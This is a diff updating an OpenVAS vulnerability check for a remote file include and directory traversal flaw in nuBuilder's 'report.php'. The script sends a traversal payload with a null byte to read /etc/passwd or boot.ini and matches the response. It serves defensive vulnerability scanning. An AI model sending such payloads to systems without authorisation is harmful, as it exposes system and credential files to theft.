@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_nubuilder_42027.nasl 5323 2017-02-17 08:49:23Z teissa $
+# $Id: gb_nubuilder_42027.nasl 5760 2017-03-29 10:24:17Z cfi $
 #
 # nuBuilder 'report.php' Remote File Include Vulnerability
 #
@@ -35,12 +35,11 @@ also possible.
 
 nuBuilder 10.04.20 is vulnerable; other versions may also be affected.";
 
-
-if (description)
+if(description)
 {
  script_id(100730);
- script_version("$Revision: 5323 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-17 09:49:23 +0100 (Fri, 17 Feb 2017) $");
+ script_version("$Revision: 5760 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 12:24:17 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2010-08-02 14:28:14 +0200 (Mon, 02 Aug 2010)");
  script_bugtraq_id(42027);
  script_tag(name:"cvss_base", value:"7.5");
@@ -54,7 +53,7 @@ if (description)
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "summary" , value : tag_summary);
@@ -63,25 +62,27 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
-   
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+include("host_details.inc");
 
+port = get_http_port(default:80);
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/nubuilder",cgi_dirs());
-files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");
+files = traversal_files();
 
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/nubuilder", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
+
   foreach file (keys(files)) {
 
-    url = string(dir,"/productionnu2/report.php?StartingDirectory=../../../../../../../../../../../",files[file],"%00"); 
+    url = string(dir,"/productionnu2/report.php?StartingDirectory=../../../../../../../../../../../",files[file],"%00");
+
     if(http_vuln_check(port:port, url:url,pattern:file)) {
-      security_message(port:port);
-      exit(0);
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
 
-exit(0);
+exit( 99 );
